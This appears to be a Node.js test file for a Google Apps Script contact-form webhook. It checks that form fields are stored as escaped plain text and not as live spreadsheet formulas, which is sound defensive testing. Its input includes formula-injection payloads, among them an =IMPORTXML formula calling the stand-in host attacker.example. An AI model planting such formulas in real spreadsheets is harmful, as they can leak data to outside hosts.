import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import vm from "node:vm";
import test from "node:test";

async function loadTemplate() {
  const rows = [];
  const sheet = {
    appendRow(row) { rows.push(row); },
    getLastRow() { return rows.length; },
    setFrozenRows() {},
  };
  const context = vm.createContext({
    ContentService: {
      MimeType: { JSON: "application/json" },
      createTextOutput(value) {
        return { setMimeType() { return { value }; } };
      },
    },
    JSON,
    PropertiesService: { getScriptProperties: () => ({ getProperty: () => "shared-secret" }) },
    Session: { getScriptTimeZone: () => "Asia/Ho_Chi_Minh" },
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ({
        getSheetByName: () => sheet,
        insertSheet: () => sheet,
      }),
    },
    Utilities: {
      formatDate: () => "20260725-100000",
      getUuid: () => "abcd1234-0000-0000-0000-000000000000",
    },
  });
  const source = await readFile(new URL("../docs/google-apps-script-contact-webhook.gs", import.meta.url), "utf8");
  vm.runInContext(source, context);
  return { context, rows };
}

test("stores user-controlled values as safe plain text instead of spreadsheet formulas", async () => {
  const { context, rows } = await loadTemplate();
  const output = context.doPost({
    postData: {
      contents: JSON.stringify({
        email: "customer@example.test",
        message: "=IMPORTXML(\"https://attacker.example\", \"//x\")",
        name: "+cmd",
        phone: "0900000000",
        secret: "shared-secret",
        source: "-1+1",
      }),
    },
  });

  assert.deepEqual(JSON.parse(output.value), { ok: true, reference: "YC-20260725-100000-ABCD1234" });
  assert.deepEqual(Array.from(rows[1].slice(2, 7)), [
    "'+cmd",
    "0900000000",
    "customer@example.test",
    "'=IMPORTXML(\"https://attacker.example\", \"//x\")",
    "'-1+1",
  ]);
});
